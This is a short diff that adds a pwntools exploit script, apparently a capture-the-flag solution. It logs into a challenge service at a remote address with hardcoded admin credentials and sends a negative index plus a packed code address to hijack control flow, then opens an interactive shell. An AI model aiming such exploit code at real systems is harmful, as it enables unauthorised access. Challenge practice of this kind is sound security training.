@@ -1,0 +1,11 @@
+from pwn import *
+p=process('./chal')
+p=remote('23.146.248.136', 31480)
+p.sendline(b'admin')
+p.sendline('P@ssw0rd_8e2h58qt9tq5Õ'.encode())
+p.sendline(b'2')
+p.sendline(b'-2')
+p.sendline(p64(0x40129b))
+p.sendline(b'1234')
+p.sendline(b'3')
+p.interactive()
